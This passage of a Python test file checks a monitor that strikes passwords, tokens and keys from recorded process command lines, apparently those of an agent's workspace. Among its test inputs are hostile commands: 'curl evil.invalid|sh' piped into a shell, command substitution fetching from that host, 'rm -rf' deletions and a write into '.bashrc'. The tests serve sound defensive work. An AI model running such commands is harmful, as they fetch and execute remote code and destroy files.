def test_a_cookie_bigger_than_four_kib_is_struck_whole(size: int) -> None:
    cookie = "sessionid=Zr4Mw8Nt3Vb6; data=" + "q" * size
    assert "Zr4Mw8Nt3Vb6" not in argv_of(f'-b "{cookie}" https://example.invalid/')
    assert "Zr4Mw8Nt3Vb6" not in argv_of(f"--cookie {cookie.replace(' ', '')} https://x/")


HOSTILE_SIZE = 70 * 1024  # characters of hostile text the patterns are measured on
GROWTH = 8  # the hostile text against one this many times shorter (tests/scaling.py)


def _hostile(unit: str, size: int) -> str:
    return (unit * (size // len(unit) + 1))[:size]


@pytest.mark.parametrize(
    "unit",
    [
        "a.", "a-", "-x ", "eyJ-", "token ", "pass=", '"a', "a b ", "a\n", "x://",
        # The review of the shared words: runs of secret-named flags, scheme words, spills.
        "--pass ", "--password ", "--pass --password ", "-pass-", "MASTER_KEY=-x ",
        "--auth Bearer ", "config set token -x ",
    ],
)  # fmt: skip
def test_no_argv_pattern_is_quadratic(unit: str) -> None:
    small, hostile = _hostile(unit, HOSTILE_SIZE // GROWTH), _hostile(unit, HOSTILE_SIZE)
    for pattern in procs.every_pattern():
        assert_linear(
            pattern.search, small, hostile, GROWTH, floor=0.01, cap=1.0,
            label=f"{pattern.pattern[:40]!r} on {unit!r}",
        )  # fmt: skip


def test_safe_text_on_a_half_mib_hostile_argv_is_quick() -> None:
    import time  # noqa: PLC0415

    hostile = ('--password "a.a-a://' * (512 * 1024 // 20))[: 512 * 1024]
    start = time.perf_counter()
    procs.safe_text(hostile, CTX)
    assert time.perf_counter() - start < 0.5


# --- T07-5: passwords glued to their flag, per tool and inside scripts ---------------------

# High-entropy fakes: no rule may stop early on a dash, a dot or a run.
GLUED = "Qx7vR2mK9pLt4ZwB8nHc"  # noqa: S105 - a fake
GLUED2 = "Vb6Yc1Df5Gh0JqR2mX9k"  # noqa: S105 - a fake


def exec_of(binary: str, arguments: str, flags: str = "execve clone") -> Record:
    data = with_arguments(arguments)
    data["process_exec"]["process"]["binary"] = binary
    data["process_exec"]["process"]["flags"] = flags
    result = classify(data, CTX)
    assert isinstance(result, Record), result
    return result


@pytest.mark.parametrize(
    ("binary", "arguments", "kept"),
    [
        ("/usr/bin/mysql", f"-uroot -p{GLUED} shop", "-uroot"),
        ("/usr/bin/mysql", f"-h db.invalid -p{GLUED} -e 'select 1'", "select 1"),
        ("/usr/bin/mysqldump", f"-uroot -p{GLUED} shop", "shop"),
        ("/usr/bin/mariadb", f"--user=root -p{GLUED} shop", "--user=root"),
        ("/usr/bin/mariadb-dump", f"-p{GLUED} --all-databases", "--all-databases"),
        ("/usr/bin/mysql", f'"-p{GLUED} {GLUED2}" shop', "shop"),  # Tetragon-quoted element
        ("/usr/bin/sshpass", f"-p {GLUED} ssh user@host.invalid", "ssh user@host.invalid"),
        ("/usr/bin/sshpass", f"-p{GLUED} ssh user@host.invalid", "ssh user@host.invalid"),
        ("/usr/bin/sshpass", f'-p "{GLUED} {GLUED2}" ssh host.invalid', "ssh host.invalid"),
        ("/usr/bin/redis-cli", f"-h cache.invalid -a {GLUED} ping", "ping"),
        ("/usr/bin/redis-cli", f"-a{GLUED} --no-auth-warning get k", "get k"),
        ("/usr/bin/mongosh", f"-u admin -p {GLUED} --authenticationDatabase admin", "-u admin"),
        ("/usr/bin/mongodump", f"-u admin -p{GLUED} --db shop", "--db shop"),
        ("/usr/bin/lftp", f"-u alice,{GLUED} sftp://host.invalid", "sftp://host.invalid"),
        ("/usr/bin/smbclient", f"//host.invalid/share -U alice%{GLUED}", "//host.invalid/share"),
        ("/usr/bin/smbclient", f"//h.invalid/s --user=alice%{GLUED} -c ls", "-c ls"),
        ("/usr/bin/curl", f"-ualice:{GLUED} https://example.invalid/", "https://example.invalid"),
        ("/usr/bin/curl", f"-U proxy:{GLUED} https://example.invalid/", "https://example.invalid"),
        ("/usr/bin/curl", f"--oauth2-bearer {GLUED} https://x.invalid/", "https://x.invalid/"),
        ("/usr/bin/wget", f"--password={GLUED} https://x.invalid/", "https://x.invalid/"),
        ("/usr/bin/wget", f"--http-password {GLUED} https://x.invalid/", "https://x.invalid/"),
        ("/usr/bin/wget", f"--ftp-password={GLUED} ftp://x.invalid/", "ftp://x.invalid/"),
        ("/usr/bin/psql", f"postgresql://alice:{GLUED}@db.invalid/shop", "db.invalid/shop"),
        ("/usr/bin/psql", f'"host=db.invalid password={GLUED} dbname=shop"', "dbname=shop"),
        ("/usr/bin/ftp", f"ftp://alice:{GLUED}@ftp.invalid/", "ftp.invalid"),
        ("/usr/bin/openssl", f"enc -aes256 -pass pass:{GLUED} -in f", "-in f"),
    ],
)
def test_a_tool_password_glued_or_spaced_is_struck(binary: str, arguments: str, kept: str) -> None:
    argv = exec_of(binary, arguments).details["argv"]
    assert GLUED not in argv and GLUED2 not in argv, argv
    assert kept in argv, argv


@pytest.mark.parametrize(
    ("arguments", "kept"),
    [
        (f'-c "mysql -uroot -p{GLUED} shop; ls /w"', "ls /w"),
        (f"-c \"/usr/bin/mysql -p'{GLUED} {GLUED2}' shop && echo ok\"", "echo ok"),
        (f'-c "cd /w && mariadb -p"{GLUED}" shop"', "cd /w"),
        (f'-c "MYSQL_PWD={GLUED} mysql shop"', "mysql shop"),
        (f'-c "PGPASSWORD={GLUED} psql -h db.invalid"', "psql -h db.invalid"),
        (f'-c "SSHPASS={GLUED} sshpass -e ssh host.invalid"', "ssh host.invalid"),
        (f'-c "REDISCLI_AUTH={GLUED} redis-cli ping"', "redis-cli ping"),
        (f'-c "sshpass -p {GLUED} ssh host.invalid && echo ok"', "echo ok"),
        (f'-c "redis-cli -a {GLUED} ping | cat"', "| cat"),
        (f'-c "mongosh -u a -p {GLUED} | tee x"', "tee x"),
        (f'-c "lftp -u alice,{GLUED} host.invalid; echo done"', "echo done"),
        (f'-c "smbclient //h.invalid/s -U alice%{GLUED} -c ls"', "-c ls"),
        (f"-c \"x=$(mysql -N -p{GLUED} -e 'select 1'); echo $x\"", "echo $x"),
        (f"-c 'import os; os.system(\"mysql -p{GLUED} shop\")'", "import os"),
    ],
)
def test_a_tool_password_inside_a_script_is_struck(arguments: str, kept: str) -> None:
    argv = exec_of("/bin/sh", arguments).details["argv"]
    assert GLUED not in argv and GLUED2 not in argv, argv
    assert kept in argv, argv


@pytest.mark.parametrize(
    ("binary", "arguments", "kept"),
    [
        # Bounded to the tool's own command: a -p of the next one is not a password.
        ("/bin/sh", '-c "mysql shop; mkdir -pnew /w/x"', "mkdir -pnew /w/x"),
        ("/bin/sh", '-c "mysql -p; rm -rf /w"', "rm -rf /w"),
        ("/bin/sh", "-c 'git checkout -b x && rm -rf /w'", "rm -rf /w"),
        ("/bin/sh", '-c "mkdir -p /w/x && mysqlfoo.sh -pkeep"', "mysqlfoo.sh -pkeep"),
        ("/usr/bin/ssh", "-p2222 user@host.invalid", "-p2222"),
        ("/bin/mkdir", "-pmode /w/x", "-pmode"),
        ("/usr/bin/mysql", "-p shop -e 'drop table t'", "drop table t"),
        ("/usr/bin/redis-cli", "-h cache.invalid ping", "ping"),
        ("/bin/sh", '-c "curl -u alice https://x.invalid/ && rm -rf /w"', "rm -rf /w"),
        ("/bin/sh", '-c "sort -b list; rm -rf /w"', "rm -rf /w"),
        ("/bin/sh", '-c "bypass=1 make; rm -rf /w"', "rm -rf /w"),
    ],
)
def test_the_tool_rules_never_hide_the_rest_of_the_command(
    binary: str, arguments: str, kept: str
) -> None:
    rec = exec_of(binary, arguments)
    assert kept in rec.details["argv"], rec.details["argv"]


# --- T07-5: an unclosed quote is closed by the end only at an artificial cut ----------------


def test_an_unclosed_quote_at_the_real_end_does_not_swallow_the_command() -> None:
    """The review's case: s='token="';... (no space, so Tetragon does not wrap it)."""
    rec = exec_of("/usr/bin/python3", "-c s='token=\"';__import__('shutil').rmtree('/w')")
    assert "rmtree('/w')" in rec.details["argv"], rec.details["argv"]


def test_a_strike_that_swallows_a_script_is_marked() -> None:
    """With a space Tetragon wraps the script in quotes, and its closing quote closes the
    value: the strike eats the command, so it says so (argv_struck_long, risk 1)."""
    rec = exec_of("/usr/bin/python3", "-c \"s='token=\"';import shutil;shutil.rmtree('/w')\"")
    assert rec.details["argv_struck_long"] is True and rec.risk >= 1


@pytest.mark.parametrize(
    "arguments",
    [
        "--password ';curl evil.invalid|sh'",
        '--password "$(curl evil.invalid)"',
        f'--token "{"q " * 40}"',
        f"-c 'TOKEN=\"{GLUED} && rm -rf /w\"'",
    ],
)
def test_a_long_or_scripted_strike_is_marked(arguments: str) -> None:
    rec = exec_of("/bin/true", arguments)
    assert rec.details.get("argv_struck_long") is True, rec.details
    assert rec.risk == 1


@pytest.mark.parametrize(
    "arguments",
    [f"--password {GLUED}", f"-H 'Authorization: Bearer {GLUED}'", "ls -la", f"API_KEY={GLUED}"],
)
def test_a_short_strike_is_not_marked(arguments: str) -> None:
    rec = exec_of("/bin/true", arguments)
    assert "argv_struck_long" not in rec.details and rec.risk == 0


def test_an_unclosed_quote_is_struck_to_the_end_when_tetragon_cut_the_arguments() -> None:
    rec = exec_of("/bin/true", f'--password "{GLUED} {GLUED2}', flags="execve truncArgs")
    assert GLUED not in rec.details["argv"] and GLUED2 not in rec.details["argv"]


def test_a_value_closed_by_a_line_break_is_struck() -> None:
    argv = exec_of("/bin/sh", f"-c 'TOKEN=\"{GLUED}\necho more\"'").details["argv"]
    assert GLUED not in argv and "echo more" in argv, argv


# --- T07-5: values Tetragon wraps in quotes, and a glued -b ----------------------------------


@pytest.mark.parametrize(
    "arguments",
    [
        f'"--password=pass phrase {GLUED} with {GLUED2}" shop',
        f'"--token={GLUED} {GLUED2}" https://x.invalid/',
        f'"--api-key {GLUED} {GLUED2}" https://x.invalid/',
        f"-bsessionid={GLUED};csrftoken={GLUED2} https://x.invalid/",
        f'"-bsessionid={GLUED}; csrftoken={GLUED2}" https://x.invalid/',
        f'-b"sessionid={GLUED}; csrftoken={GLUED2}" https://x.invalid/',
    ],
)
def test_a_value_tetragon_wrapped_in_quotes_is_struck_to_its_close(arguments: str) -> None:
    argv = exec_of("/usr/bin/curl", arguments).details["argv"]
    assert GLUED not in argv and GLUED2 not in argv, argv
    assert "x.invalid" in argv or "shop" in argv or "run" in argv


def test_env_with_an_assignment_tetragon_wrapped_is_struck_to_its_close() -> None:
    argv = exec_of("/usr/bin/env", f'"DB_PASSWORD={GLUED} {GLUED2}" run').details["argv"]
    assert GLUED not in argv and GLUED2 not in argv and argv.endswith("run"), argv
    # The same shape inside a script is a command, and stays in sight.
    argv = exec_of("/bin/sh", f'-c "PGPASSWORD={GLUED} psql -h db.invalid"').details["argv"]
    assert GLUED not in argv and "psql -h db.invalid" in argv, argv


# --- T07-5: the low ones ---------------------------------------------------------------------


def test_an_escaped_quote_inside_a_json_value_does_not_end_it() -> None:
    argv = argv_of(f'-d \'{{"api_key": "ab\\"{GLUED}", "x": 1}}\'')
    assert GLUED not in argv, argv


def test_a_jwt_with_a_payload_over_4_kib_is_struck() -> None:
    payload = "eyJ" + ("Ab3dE6gH9" * 600)
    token = f"eyJhbGciOiJIUzI1NiJ9.{payload}.{GLUED}"
    argv = argv_of(f"-H x {token} done")
    assert "Ab3dE6gH9Ab3dE6gH9" not in argv and GLUED not in argv, argv


def test_a_fake_key_end_cannot_strike_short_lines_before_it() -> None:
    lines = "\n".join(["cd", "whoami", "reboot", "ls"])
    arguments = "-c '" + "x " * 3000 + "\n" + lines + "\n-----END RSA PRIVATE KEY-----'"
    argv = argv_of(arguments)
    assert "whoami" in argv and "reboot" in argv, argv


def test_a_real_key_body_before_its_end_is_still_struck() -> None:
    body = "\n".join((_B64 * 2)[i : i + 64] for i in range(0, 64 * 4, 64)) + "\nAB12=="
    arguments = "-c '" + "x " * 3000 + "\n" + body + "\n-----END RSA PRIVATE KEY-----'"
    assert _B64[:20] not in argv_of(arguments)


# --- T07-5: the cost of every new or changed pattern -----------------------------------------


@pytest.mark.parametrize(
    "unit",
    [
        "a.", "-p", "-p'", '-p"', "mysql -p", "mysql ", 'mysql -p"', "mysql -p'a ",
        "sshpass -p ", "redis-cli -a ", "lftp -u a,", "-U a%", "-ua:", "MYSQL_PWD=",
        '"--password=', '"-b', "-ba=", '"-ba=', "TOKEN=\"a\n", '"api_key": "\\"',
        "eyJa.eyJ", "eyJ-", "A" * 40 + "\n", "pass:", "a b ", "x://",
        '"--user=a:', "--user=a", "-U a", "lftp -u a", "scott/", "a/", "config set ",
        "identified by '", "password '", "docker login -p ", "-nb a ", "-b a b c ", '-u "a:',
        "-u 'a:", 'sudo mysql "-p', "/p:", "secretsecret",
    ],
)  # fmt: skip
def test_the_t07_5_patterns_are_linear(unit: str) -> None:
    small, hostile = _hostile(unit, HOSTILE_SIZE // GROWTH), _hostile(unit, HOSTILE_SIZE)
    for binary in (
        "/usr/bin/mysql", "/usr/bin/sshpass", "/usr/bin/lftp", "/bin/sh", "/usr/bin/curl",
        "/usr/bin/smbclient", "/usr/sbin/htpasswd", "/usr/bin/sqlplus", "/usr/bin/docker",
    ):  # fmt: skip
        tool = procs._tool_of(binary)
        assert_linear(
            lambda text, tool=tool: procs._strike_patterns(text, tool=tool, open_end=True),
            small, hostile, GROWTH, floor=0.01, cap=2.0, label=f"{binary} on {unit!r}",
        )  # fmt: skip
    for pattern in procs.every_pattern():
        assert_linear(
            lambda text, pattern=pattern: pattern.sub("", text),
            small, hostile, GROWTH, floor=0.01, cap=1.0,
            label=f"{pattern.pattern[:50]!r} on {unit!r}",
        )  # fmt: skip
    assert_linear(
        procs._strike_key_bodies, small, hostile, GROWTH, floor=0.01, cap=1.0, label=repr(unit)
    )


def test_the_linearity_check_catches_a_quadratic_pattern() -> None:
    """What the check above stands on: a pattern that rescans the rest of the text from every
    start fails it, on any machine, and a linear one passes."""
    quadratic = re.compile(r"a[^x]*x")  # "a a a ...": from each "a", to the end, no "x"
    small, large = _hostile("a ", 32 * 1024 // GROWTH), _hostile("a ", 32 * 1024)
    with pytest.raises(AssertionError, match="is not linear"):
        assert_linear(quadratic.search, small, large, GROWTH, floor=0.01, cap=30.0, label="q")
    linear = re.compile(r"a[^x ]*x")  # the same, stopped by the space
    assert_linear(linear.search, small, large, GROWTH, floor=0.0, cap=1.0, label="l")


# --- T07-5 review: more tools, values with spaces, connections ------------------------------


@pytest.mark.parametrize(
    ("binary", "arguments", "kept"),
    [
        ("/usr/bin/podman", f"login -u me -p {GLUED} registry.invalid", "registry.invalid"),
        ("/usr/bin/docker", f"login -u me -p{GLUED} registry.invalid", "registry.invalid"),
        ("/usr/bin/helm", f"registry login -u me -p {GLUED} r.invalid", "r.invalid"),
        ("/usr/bin/ldapsearch", f"-x -D cn=admin -w {GLUED} -b dc=x", "cn=admin"),
        ("/usr/bin/sqlcmd", f"-S db.invalid -U sa -P {GLUED} -Q 'select 1'", "select 1"),
        ("/usr/bin/ipmitool", f"-H bmc.invalid -U admin -P {GLUED} power status", "power status"),
        ("/usr/bin/mosquitto_pub", f"-u me -P {GLUED} -t t -m hi", "-t t"),
        ("/usr/bin/zip", f"-P {GLUED} out.zip a.txt", "out.zip"),
        ("/usr/bin/unzip", f"-P {GLUED} in.zip", "in.zip"),
        ("/usr/bin/7z", f"a -p{GLUED} out.7z a.txt", "out.7z"),
        ("/usr/bin/openssl", f"enc -aes-256-cbc -k {GLUED} -in f", "-in f"),
        ("/usr/bin/ssh-keygen", f"-t ed25519 -N {GLUED} -f key", "-f key"),
        ("/usr/bin/curl", f"-E cert.pem:{GLUED} https://x.invalid/", "https://x.invalid/"),
        ("/usr/bin/curl", f"--cert cert.pem:{GLUED} https://x.invalid/", "https://x.invalid/"),
        ("/usr/bin/sqlplus", f"scott/{GLUED}@orcl @run.sql", "@run.sql"),
        ("/usr/bin/gh", f"secret set TOKEN_X --body {GLUED}", "secret set"),
        ("/usr/bin/vault", f"login {GLUED}", "login"),
        ("/usr/sbin/htpasswd", f"-b /etc/pw alice {GLUED}", "alice"),
        ("/usr/sbin/htpasswd", f"-nb alice {GLUED}", "alice"),
        ("/usr/bin/nmcli", f"dev wifi connect home password {GLUED}", "connect home"),
        ("/usr/bin/xfreerdp", f"/v:h.invalid /u:me /p:{GLUED}", "/u:me"),
        ("/usr/bin/aws", f"configure set aws_secret_access_key {GLUED}", "configure set"),
        ("/usr/bin/npm", f"config set //r.invalid/:_authToken {GLUED}", "config set"),
        ("/usr/bin/mysql", f"-e \"CREATE USER u IDENTIFIED BY '{GLUED}'\"", "CREATE USER u"),
        ("/usr/bin/psql", f"-c \"ALTER USER u WITH PASSWORD '{GLUED}'\"", "ALTER USER u"),
        # Values with spaces, wrapped by Tetragon, after flags that name no secret word.
        ("/usr/bin/curl", f'-u "alice:pw {GLUED}" https://x.invalid/', "https://x.invalid/"),
        ("/usr/bin/curl", f'--user "alice:pw {GLUED}" https://x.invalid/', "x.invalid"),
        ("/usr/bin/curl", f'"--user=alice:pw {GLUED}" https://x.invalid/', "x.invalid"),
        ("/usr/bin/curl", f'--proxy-user "a:pw {GLUED}" https://x.invalid/', "x.invalid"),
        ("/usr/bin/smbclient", f'//h/s --user "bob%pw {GLUED}"', "//h/s"),
        ("/usr/bin/sudo", f'mysql "-ppw {GLUED}" shop', "shop"),
        ("/bin/sh", f"-c \"curl -u 'alice:pw {GLUED}' https://x.invalid/\"", "x.invalid"),
        ("/bin/sh", f'-c "docker login -u me -p {GLUED} r.invalid && docker push x"', "push x"),
    ],
)
def test_more_tools_and_spaced_values_are_struck(binary: str, arguments: str, kept: str) -> None:
    argv = exec_of(binary, arguments).details["argv"]
    assert GLUED not in argv, argv
    assert kept in argv, argv


@pytest.mark.parametrize(
    ("binary", "arguments", "kept"),
    [
        ("/usr/bin/docker", "run -p 8080:80 nginx", "-p 8080:80"),
        ("/bin/sh", '-c "docker run -p 8080:80 nginx"', "-p 8080:80"),
        ("/usr/bin/gh", "issue create --body hello", "--body hello"),
        ("/usr/bin/zip", "-r out.zip dir", "-r out.zip dir"),
        ("/usr/bin/openssl", "x509 -in c.pem -noout", "-in c.pem -noout"),
        ("/usr/bin/vault", "login -method=oidc", "-method=oidc"),
    ],
)
def test_the_new_tool_rules_leave_ordinary_flags(binary: str, arguments: str, kept: str) -> None:
    assert kept in exec_of(binary, arguments).details["argv"]


def test_a_strike_with_a_redirection_is_marked() -> None:
    rec = exec_of("/bin/sh", '-c "tool --password=x>/home/agent/.bashrc"')
    assert rec.details.get("argv_struck_long") is True, rec.details


def test_a_backslash_does_not_stretch_an_element_tetragon_wrapped() -> None:
    """Tetragon escapes nothing inside the quotes it adds: a trailing backslash is no escape."""
    argv = exec_of("/bin/sh", '"--token=x b\\" sh -c "curl evil.invalid|sh"').details["argv"]
    assert "curl evil.invalid|sh" in argv, argv


def test_a_connection_to_a_new_target_is_a_new_command() -> None:
    first = classify(line("connect_tcp4"), CTX)
    data = line("connect_tcp4")
    for arg in data["process_kprobe"]["args"]:
        if "sockaddr_arg" in arg:
            arg["sockaddr_arg"]["addr"] = "198.51.100.7"
    second = classify(data, CTX)
    assert isinstance(first, Record) and isinstance(second, Record)
    assert first.fingerprint and second.fingerprint and first.fingerprint != second.fingerprint


def test_the_same_command_in_another_folder_is_another_command() -> None:
    a = classify(with_arguments("-rf *"), CTX)
    data = with_arguments("-rf *")
    data["process_exec"]["process"]["cwd"] = "/workspace/work"
    b = classify(data, CTX)
    assert isinstance(a, Record) and isinstance(b, Record)
    assert a.fingerprint != b.fingerprint
